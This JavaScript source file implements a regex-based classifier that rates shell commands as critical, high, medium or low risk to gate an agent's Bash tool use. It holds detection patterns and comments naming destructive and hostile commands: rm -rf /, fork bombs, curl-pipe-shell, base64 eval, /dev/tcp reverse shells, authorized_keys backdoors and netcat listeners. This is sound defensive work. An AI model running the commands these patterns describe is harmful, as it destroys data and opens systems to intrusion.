'use strict';

// (TODO 11.5) Risk classifier — building block toward Shadow Execution.
//
// Given a shell command string, return:
//   { level: 'low' | 'medium' | 'high' | 'critical',
//     reasons: [{ code, label, snippet }],
//     suggestedAction: 'allow' | 'review' | 'deny',
//     decoded: '<denoised version when obfuscation was detected>' | null }
//
// The classifier is intentionally PURE and SYNCHRONOUS:
//   - no Docker / chroot
//   - no AI / LLM
//   - no filesystem access
//   - no execution
//
// It is the first step of 11.5; downstream patches plug it into
// PreToolUse hooks / Bash permission checks / `c4 review` workflows
// to gate critical commands behind explicit approval.
//
// Why heuristic only?
// -------------------
// Static pattern matching catches 90% of the common dangerous shapes
// (rm -rf, sudo, curl|sh, fork bombs, base64-decoded eval) without a
// language barrier or runtime cost. The remaining 10% — cleverly
// obfuscated payloads — should be handled by the eventual sandbox
// dispatcher. Until then, this module's `level: 'high'` rows are the
// hand-off point: an upstream caller can ask the operator before
// running, even when the regex misses subtle variants.
//
// Action mapping
// --------------
// `suggestedAction` is the recommended gate behavior — callers may
// override based on profile / autoMode / user role:
//   - critical -> deny  (block outright; require manual override)
//   - high     -> review (escalate to operator; never auto-approve)
//   - medium   -> review (escalate when autoMode is on)
//   - low      -> allow  (no gating)
//
// Reason codes
// ------------
// Each match emits a `{ code, label, snippet }` so audit logs can pin
// the offending pattern. Codes are stable so a future config can
// per-machine elevate / demote levels.

// --- Patterns ---------------------------------------------------------

// Critical: catastrophic outcomes. Block outright.
const CRITICAL_PATTERNS = [
  {
    code: 'rm-rf-root',
    label: 'rm -rf at filesystem root',
    // Matches `rm -rf /`, `rm -rf --no-preserve-root /`, `rm -rf '/'`,
    // and `rm -rf $HOME` (env-var pointing at /). Each flag form
    // requires trailing whitespace so the regex can't backtrack into
    // partial flag consumption (e.g. `rm -rfffff` would otherwise
    // match by splitting `-rfffff` into `-r` + a fake "directory").
    re: /\brm\s+(?:-[rRf]+\s+|--recursive\s+|--force\s+|--no-preserve-root\s+)+(?:["']?\/+["']?(?:\s|$|;|&|\|))/,
  },
  {
    code: 'rm-rf-tilde',
    label: 'rm -rf $HOME',
    // Accept both short (-rf) and long (--recursive / --force) flag
    // forms — operators paste from docs and the long form is common
    // in scripts ("rm --recursive --force ~"). Trailing \s+ on every
    // flag alt blocks the same backtracking abuse documented on
    // rm-rf-root above.
    re: /\brm\s+(?:-[rRf]+\s+|--recursive\s+|--force\s+|--no-preserve-root\s+)+(?:~|\$HOME|"\$HOME"|'\$HOME')(?:\s|$|;|&|\|)/,
  },
  {
    code: 'fork-bomb',
    label: 'fork bomb',
    // Classic :(){ :|:& };: shape. Tolerant to whitespace.
    re: /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/,
  },
  {
    code: 'mkfs',
    label: 'mkfs (filesystem format)',
    re: /\bmkfs\b/,
  },
  {
    code: 'dd-block-device',
    label: 'dd to a block device',
    // dd if=... of=/dev/sda1 / /dev/nvme0n1 / /dev/mmcblk0p1 etc.
    // Use a non-word terminator class so partition suffixes (n1, p1)
    // are part of the matched device name rather than blocking the
    // boundary.
    re: /\bdd\b[^\n]*\bof=\/dev\/(?:sd[a-z]\d*|nvme\d+(?:n\d+)?|hd[a-z]\d*|mmcblk\d+(?:p\d+)?)(?:\s|$|;|&|\|)/,
  },
  {
    code: 'overwrite-block-device',
    label: 'redirect into a block device',
    re: />\s*\/dev\/(?:sd[a-z]\d*|nvme\d+(?:n\d+)?|hd[a-z]\d*|mmcblk\d+(?:p\d+)?)(?:\s|$|;|&|\|)/,
  },
  {
    code: 'curl-pipe-shell',
    label: 'curl | sh / wget | bash (remote execution)',
    re: /\b(?:curl|wget)\s[^\n|]*\|\s*(?:sh|bash|zsh|fish)\b/,
  },
  {
    code: 'eval-base64',
    label: 'eval of base64-decoded payload',
    re: /\b(?:eval|exec|sh|bash)\s+[^\n]*\bbase64\s+(?:-d|--decode|-D)\b/,
  },
  // (v1.10.54) Catastrophic but missing from the original catalog.
  {
    code: 'docker-sock-mount',
    label: 'docker run -v /var/run/docker.sock (container escape)',
    // Mounting the docker socket into a container hands root on the
    // host to whoever runs that container. Same severity as
    // privileged: catastrophic, no benign cause.
    re: /\bdocker\s+(?:run|create|exec)\s+[^\n;|&]*-v\s+\/var\/run\/docker\.sock/,
  },
  {
    code: 'curl-pipe-interpreter',
    label: 'curl | python / perl / ruby / node (remote code exec)',
    // Same shape as curl-pipe-shell but for non-shell interpreters —
    // remote one-liners that fetch and run untrusted code without
    // human review.
    re: /\b(?:curl|wget)\s[^\n|]*\|\s*(?:python\d*|perl|ruby|node|php)\b/,
  },
  {
    code: 'reverse-shell',
    label: 'classic reverse-shell construction',
    // bash -i >& /dev/tcp/host/port 0>&1 — bash's internal /dev/tcp
    // pseudo-device opens a TCP socket without netcat. Always
    // catastrophic: there's no legitimate reason to write that.
    // The negation excludes `\n` and `;` (statement boundaries) but
    // NOT `&` / `|` because the construction itself uses `>&` for
    // file-descriptor redirection.
    re: /\bbash\s+-i\b[^\n;]*\/dev\/tcp\//,
  },
];

// High: dangerous but legitimately useful. Escalate to operator.
const HIGH_PATTERNS = [
  {
    code: 'rm-rf-dir',
    label: 'rm -rf <directory>',
    // rm -rf foo/, rm -rf /etc, rm -rf $TMPDIR — but skip the cases
    // already covered by the critical /-or-$HOME variants. The
    // lookahead must mirror the critical pattern's terminator class
    // (whitespace / EOL / ;&|) rather than `\b`, otherwise `\b` fires
    // between `/` and any subsequent letter ("/foo") and silently
    // suppresses the match for every absolute path. Same applies to
    // the tilde / $HOME case.
    re: /\brm\s+(?:-[rRf]+\s+|--recursive\s+|--force\s+|--no-preserve-root\s+)+(?!["']?\/+["']?(?:\s|$|;|&|\|))(?!(?:~|\$HOME|"\$HOME"|'\$HOME')(?:\s|$|;|&|\|))(?:\S+)/,
  },
  {
    code: 'chmod-recursive-777',
    label: 'chmod -R 777',
    re: /\bchmod\s+(?:-R\s+|--recursive\s+)+(?:0?777|a\+rwx)\b/,
  },
  {
    code: 'chown-recursive',
    label: 'chown -R',
    re: /\bchown\s+(?:-R\s+|--recursive\s+)/,
  },
  {
    code: 'kill-all',
    label: 'kill -9 -1 (kill every process)',
    re: /\bkill\s+(?:-9\s+|--signal\s+9\s+|-s\s+9\s+|-KILL\s+)?-1\b/,
  },
  {
    code: 'pkill-broad',
    label: 'pkill / killall on a process pattern',
    // Anything pkill / killall does affects multiple processes by
    // name — high tier even with a long pattern, since "killall node"
    // takes down the whole runtime.
    re: /\b(?:pkill|killall)\s+(?:-[a-zA-Z\d]+\s+)*\S+/,
  },
  {
    code: 'find-delete',
    label: 'find -delete',
    re: /\bfind\s+\S+[^\n|;&]*\s-(?:delete|exec\s+rm)/,
  },
  {
    code: 'git-force-push',
    label: 'git push --force / +refs',
    re: /\bgit\s+push\b[^\n;|&]*(?:--force\b|--force-with-lease=?[^\s]*\b|-f\b|\s\+[^\s]+:[^\s]+)/,
  },
  {
    code: 'git-reset-hard',
    label: 'git reset --hard',
    re: /\bgit\s+reset\s+(?:[^-\n]*\s+)?--hard\b/,
  },
  {
    code: 'git-clean-force',
    label: 'git clean -fd',
    re: /\bgit\s+clean\s+(?:-[fdx]+\s*)+/,
  },
  {
    code: 'system-files',
    label: 'redirect into /etc/ system files',
    re: />>?\s*\/etc\/(?:passwd|shadow|sudoers|hosts|crontab|fstab)\b/,
  },
  {
    code: 'ssh-known-hosts',
    label: 'overwrite ~/.ssh/known_hosts or authorized_keys',
    re: />\s*(?:~|\$HOME|\/home\/[^\s/]+)\/\.ssh\/(?:known_hosts|authorized_keys)\b/,
  },
  {
    code: 'docker-privileged',
    label: 'docker run --privileged',
    re: /\bdocker\s+(?:run|exec)\s+[^\n;|&]*--privileged\b/,
  },
  {
    code: 'reboot-shutdown',
    label: 'reboot / shutdown / halt',
    re: /\b(?:reboot|shutdown|halt|poweroff|init\s+0|init\s+6)\b/,
  },
  // (v1.10.54) Operationally dangerous: legitimate uses exist, but
  // unattended autonomous runs should escalate.
  {
    code: 'firewall-disable',
    label: 'firewall flush / disable (iptables -F / ufw disable / nft flush ruleset)',
    re: /\b(?:iptables\s+-F\b|ufw\s+(?:disable|reset)\b|nft\s+flush\s+ruleset\b)/,
  },
  {
    code: 'systemctl-disable-critical',
    label: 'systemctl stop|disable on a critical service (ssh / firewall / audit)',
    re: /\bsystemctl\s+(?:stop|disable|mask)\s+(?:ssh|sshd|firewalld|ufw|nftables|auditd|apparmor|fail2ban)\b/,
  },
  {
    code: 'pip-break-system',
    label: 'pip install --break-system-packages (PEP 668 override)',
    // Forces installs into the system Python, bypassing the
    // distribution's "managed by apt" guard. Routinely produces
    // unbootable systems.
    re: /\bpip3?\s+install\s+[^\n;|&]*--break-system-packages\b/,
  },
  {
    code: 'npm-global-install',
    label: 'npm install -g / yarn global add (system-wide write)',
    // -g installs into a system-owned prefix; under sudo it can
    // shim binaries that other users depend on.
    re: /\b(?:npm\s+install\s+(?:-g\b|--global\b)|yarn\s+global\s+add\b)/,
  },
  {
    code: 'suid-set',
    label: 'chmod u+s / setuid bit (privilege escalation primitive)',
    re: /\bchmod\s+(?:[0-7]{0,3}[0-9]?[0-7]{2,3}|u\+s|\+s)\s+\S/,
  },
  {
    code: 'usermod-sudo',
    label: 'usermod / gpasswd add to sudo / wheel / docker group',
    // Both argument orders matter:
    //   usermod -aG <groups> <user>     (group(s) first)
    //   gpasswd -a <user> <group>       (user first)
    // We don't pin the position — just that the privileged group
    // name appears anywhere on the same logical line after the
    // membership-mutating verb.
    re: /\b(?:usermod\s+-aG?|usermod\s+--append\s+--groups|gpasswd\s+-a)\b[^\n;]*\b(?:sudo|wheel|root|docker)\b/,
  },
  {
    code: 'authorized-keys-append',
    label: 'append to ~/.ssh/authorized_keys',
    // Distinct from system-files (which catches /etc/* writes) — this
    // is the classic backdoor: append a public key to a user's
    // authorized_keys so the attacker keeps SSH access.
    re: />>?\s*(?:~|\$HOME|\/home\/[^\s/]+|\/root)\/\.ssh\/authorized_keys\b/,
  },
];

// Medium: needs caution (usually ask in autonomous mode).
const MEDIUM_PATTERNS = [
  {
    code: 'sudo',
    label: 'sudo',
    re: /\bsudo\b/,
  },
  {
    code: 'git-push',
    label: 'git push (non-force)',
    // Skip if already matched by force-push above; we filter dupes below.
    re: /\bgit\s+push\b/,
  },
  {
    code: 'npm-publish',
    label: 'npm publish',
    re: /\bnpm\s+publish\b/,
  },
  {
    code: 'no-verify',
    label: 'commit / push --no-verify (skips hooks)',
    re: /--no-verify\b/,
  },
  {
    code: 'curl-script',
    label: 'curl downloading a script (without piping to shell)',
    re: /\b(?:curl|wget)\s+[^\n;|&]*\.(?:sh|bash|py|rb|pl)(?:\s|$)/,
  },
  {
    code: 'apt-install',
    label: 'apt-get / apt install (system package)',
    re: /\b(?:apt|apt-get|yum|dnf|pacman|zypper|brew)\s+(?:install|add|-S)\b/,
  },
  {
    code: 'cron-edit',
    label: 'crontab edit',
    re: /\bcrontab\s+(?:-e|-r)\b/,
  },
  // (v1.10.54) Settings drift: rarely catastrophic but worth a review
  // gate in autonomous runs since the change persists per-user/global.
  {
    code: 'git-config-global',
    label: 'git config --global / --system',
    re: /\bgit\s+config\s+(?:--global|--system)\b/,
  },
  {
    code: 'pkg-config-set',
    label: 'npm config set / yarn config set (registry / token writes)',
    re: /\b(?:npm|yarn|pnpm)\s+config\s+set\s+\S/,
  },
  {
    code: 'netcat-listen',
    label: 'nc / ncat listening on a port (potential backdoor)',
    // Detects any combined flag block containing `l` after nc / ncat
    // — `-l`, `-lp`, `-lvp`, `--listen`. The `\S*l\S*` form lets `l`
    // sit anywhere in the flag chunk so combined-short-options work.
    // Even a benign port-open is review-worthy in autonomous mode.
    re: /\b(?:nc|ncat)\s+(?:-\S*l\S*|--listen)\b/,
  },
];

// --- Obfuscation detection -------------------------------------------

// Try to expand simple obfuscation so the patterns above can hit. We
// don't do real shell parsing — just enough to defeat the most common
// LLM-prompt-injection tricks like base64 wrappers and IFS games.
function _denoiseCommand(cmd) {
  let out = cmd;

  // (v1.10.57) Strip shell line comments BEFORE pattern matching so
  // documentation like `# rm -rf / would be dangerous` doesn't trip
  // the rm-rf-root rule. We do NOT strip inline `#` (e.g. inside
  // a string literal) — that would require real tokenisation. Only
  // a `#` that follows whitespace OR start-of-line is treated as a
  // comment; everything from that point through the next newline is
  // dropped.
  out = out.replace(/(^|\s)#[^\n]*/g, '$1');

  // Base64 decode hint: if we see `base64 -d` followed by a quoted
  // literal, decode and inline so downstream patterns match.
  const b64Re = /(?:echo|printf)\s+["']([A-Za-z0-9+/=]{8,})["']\s*\|\s*base64\s+(?:-d|--decode|-D)\b/g;
  out = out.replace(b64Re, (_m, payload) => {
    try {
      const decoded = Buffer.from(payload, 'base64').toString('utf8');
      return ' ' + decoded + ' ';
    } catch {
      return _m;
    }
  });

  // $(...) command substitution: extract the inner command so its
  // dangerous content gets scanned too. We do not execute, just
  // unwrap one level — nested cases fall through, which is fine
  // (the outer call would still hit the curl|sh / eval patterns).
  out = out.replace(/\$\(([^()]+)\)/g, (_m, inner) => ' ' + inner + ' ');

  // Backtick form: same idea.
  out = out.replace(/`([^`]+)`/g, (_m, inner) => ' ' + inner + ' ');

  // IFS / quote insertions inside common dangerous tokens. Unwrap
  // alphabetic quoted segments only when they're adjacent to another
  // letter (so r"m" -> rm, su"do" -> sudo, c"url" -> curl) without
  // mangling normal quoted arguments like `git commit -m "fix bug"`.
  // The /g flag scans the input once; consecutive segments such as
  // p"k"i"l"l collapse fully because each match advances past its
  // trailing quote, leaving the next letter as the lookbehind for
  // the following match. A locked-in test in the obfuscation suite
  // pins this behaviour.
  out = out.replace(/(?<=[A-Za-z])"([A-Za-z]+)"|"([A-Za-z]+)"(?=[A-Za-z])/g, (_m, a, b) => a || b);
  out = out.replace(/(?<=[A-Za-z])'([A-Za-z]+)'|'([A-Za-z]+)'(?=[A-Za-z])/g, (_m, a, b) => a || b);

  return out;
}

// --- Public API -------------------------------------------------------

const ACTION_BY_LEVEL = {
  critical: 'deny',
  high: 'review',
  medium: 'review',
  low: 'allow',
};

function _matches(patterns, cmd) {
  const hits = [];
  for (const p of patterns) {
    const m = cmd.match(p.re);
    if (m) {
      hits.push({
        code: p.code,
        label: p.label,
        snippet: m[0].slice(0, 160),
      });
    }
  }
  return hits;
}

// Normalise a config-shaped rule entry into the internal
// `{code, label, re}` form. Accepts either:
//   - { code, label, pattern: 'regex-source', flags: 'i' }
//   - { code, label, regex: <RegExp> }
// Returns null + a reason on bad input so the caller can warn
// without throwing — operator config typos shouldn't crash the
// classifier.
function _normaliseRule(raw) {
  if (!raw || typeof raw !== 'object') return null;
  if (typeof raw.code !== 'string' || !raw.code) return null;
  if (typeof raw.label !== 'string' || !raw.label) return null;
  let re;
  if (raw.regex instanceof RegExp) {
    re = raw.regex;
  } else if (typeof raw.pattern === 'string' && raw.pattern.length > 0) {
    try { re = new RegExp(raw.pattern, raw.flags || ''); }
    catch { return null; }
  } else {
    return null;
  }
  return { code: raw.code, label: raw.label, re };
}

// Compile a list of allow/deny patterns from the config-shaped
// shape. Each entry can be a regex source string or
// `{pattern, flags}`. Returns an array of RegExp; bad entries
// are silently dropped so a single typo doesn't disable the
// whole list.
function _compilePatternList(list) {
  if (!Array.isArray(list)) return [];
  const out = [];
  for (const entry of list) {
    if (entry instanceof RegExp) { out.push(entry); continue; }
    if (typeof entry === 'string') {
      try { out.push(new RegExp(entry)); } catch { /* skip */ }
      continue;
    }
    if (entry && typeof entry === 'object' && typeof entry.pattern === 'string') {
      try { out.push(new RegExp(entry.pattern, entry.flags || '')); } catch { /* skip */ }
    }
  }
  return out;
}

function _normaliseCustomRules(customRules) {
  if (!customRules || typeof customRules !== 'object') return { critical: [], high: [], medium: [] };
  const out = { critical: [], high: [], medium: [] };
  for (const tier of ['critical', 'high', 'medium']) {
    const list = customRules[tier];
    if (!Array.isArray(list)) continue;
    for (const raw of list) {
      const r = _normaliseRule(raw);
      if (r) out[tier].push(r);
    }
  }
  return out;
}

function classifyCommand(cmd, opts = {}) {
  if (!cmd || typeof cmd !== 'string') {
    return {
      level: 'low',
      reasons: [],
      suggestedAction: 'allow',
      decoded: null,
    };
  }
  const trimmed = cmd.trim();
  if (!trimmed) {
    return {
      level: 'low',
      reasons: [],
      suggestedAction: 'allow',
      decoded: null,
    };
  }
  const denoised = _denoiseCommand(trimmed);
  const sourceForMatch = denoised !== trimmed ? denoised : trimmed;

  // (v1.10.50) Per-machine override: allowList. When any pattern
  // matches the (denoised) command, classify as low with a synthetic
  // 'allowlist-bypass' reason so audits see why the gate didn't fire.
  // Comes BEFORE the built-in pattern set so an operator can carve
  // out an exception even for built-in critical hits (e.g., a CI
  // machine that genuinely needs `chmod -R 755` on a tmpdir).
  const allowList = _compilePatternList(opts.allowList);
  for (const re of allowList) {
    if (re.test(sourceForMatch)) {
      return {
        level: 'low',
        reasons: [{ code: 'allowlist-bypass', label: 'matches operator allowList', snippet: trimmed.slice(0, 160) }],
        suggestedAction: 'allow',
        decoded: denoised !== trimmed ? denoised : null,
        inspectedSource: opts.includeInspected ? sourceForMatch : undefined,
      };
    }
  }

  const customRules = _normaliseCustomRules(opts.customRules);
  const critical = _matches(CRITICAL_PATTERNS.concat(customRules.critical), sourceForMatch);
  const high = _matches(HIGH_PATTERNS.concat(customRules.high), sourceForMatch);
  const mediumRaw = _matches(MEDIUM_PATTERNS.concat(customRules.medium), sourceForMatch);
  const highCodes = new Set(high.map((h) => h.code));
  // Filter medium hits that are already covered by the high tier so
  // `git push --force` doesn't double-emit as both `git-force-push`
  // and `git-push`.
  const medium = mediumRaw.filter((m) => {
    if (m.code === 'git-push' && highCodes.has('git-force-push')) return false;
    return true;
  });

  // (v1.10.50) Per-machine override: denyList. When any pattern
  // matches, force the result to critical with a synthetic
  // 'denylist-forced' reason. Useful when the built-in catalog is
  // too permissive for a high-stakes environment ("any reference to
  // /etc/passwd is critical here, full stop").
  const denyList = _compilePatternList(opts.denyList);
  let denyForced = false;
  for (const re of denyList) {
    if (re.test(sourceForMatch)) {
      critical.push({ code: 'denylist-forced', label: 'matches operator denyList', snippet: trimmed.slice(0, 160) });
      denyForced = true;
      break;
    }
  }

  let level;
  if (critical.length > 0) level = 'critical';
  else if (high.length > 0) level = 'high';
  else if (medium.length > 0) level = 'medium';
  else level = 'low';

  const reasons = [...critical, ...high, ...medium];

  return {
    level,
    reasons,
    suggestedAction: ACTION_BY_LEVEL[level],
    decoded: denoised !== trimmed ? denoised : null,
    // Useful for auditors who want to see what we matched against
    // without re-running the regex set.
    inspectedSource: opts.includeInspected ? sourceForMatch : undefined,
    denyForced: denyForced || undefined,
  };
}

// Pattern catalog export so tests / docs can enumerate the rule set.
const PATTERN_CATALOG = {
  critical: CRITICAL_PATTERNS.map((p) => ({ code: p.code, label: p.label })),
  high: HIGH_PATTERNS.map((p) => ({ code: p.code, label: p.label })),
  medium: MEDIUM_PATTERNS.map((p) => ({ code: p.code, label: p.label })),
};

module.exports = {
  classifyCommand,
  PATTERN_CATALOG,
  ACTION_BY_LEVEL,
  _denoiseCommand,
};
